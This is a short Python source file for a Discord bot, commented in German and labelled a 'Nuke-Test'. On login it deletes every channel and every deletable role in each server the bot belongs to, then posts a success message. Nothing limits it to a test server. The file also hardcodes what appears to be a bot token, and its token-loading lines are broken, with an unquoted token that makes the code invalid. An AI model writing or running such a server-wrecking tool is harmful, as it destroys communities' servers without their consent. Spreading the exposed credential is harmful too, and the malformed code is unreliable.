import os
import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Eingeloggt als {bot.user}")

    for guild in bot.guilds:
        print(f"Starte Nuke-Test auf: {guild.name}")

        # 1. Alle Kanäle löschen
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Kanal gelöscht: {channel.name}")
            except Exception as e:
                print(f"Fehler bei {channel.name}: {e}")

        # 2. Alle löschbaren Rollen entfernen
        for role in guild.roles:
            if role.is_default() or role.managed:
                continue
            try:
                await role.delete()
                print(f"Rolle gelöscht: {role.name}")
            except Exception as e:
                print(f"Fehler bei Rolle {role.name}: {e}")

        # 3. Test-Kanal erstellen
        try:
            ch = await guild.create_text_channel("nuke-test-erfolgreich")
            await ch.send("⚠️ Nuke-Test abgeschlossen!")
        except Exception as e:
            print(f"Fehler beim Erstellen des Kanals: {e}")

    await bot.close()

token = os.environ.get("MTU1NTI5NjM3MzIyMDMxMTA3MA.GVTcQ_.YVEVXgcEDqT8cwxbB296w-Gla4xA0sogZnlnxg")
if token:
    bot.run(MTU1NTI5NjM3MzIyMDMxMTA3MA.GVTcQ_.YVEVXgcEDqT8cwxbB296w-Gla4xA0sogZnlnxg)
else:
    print("Fehler: Kein DISCORD_TOKEN gefunden!")
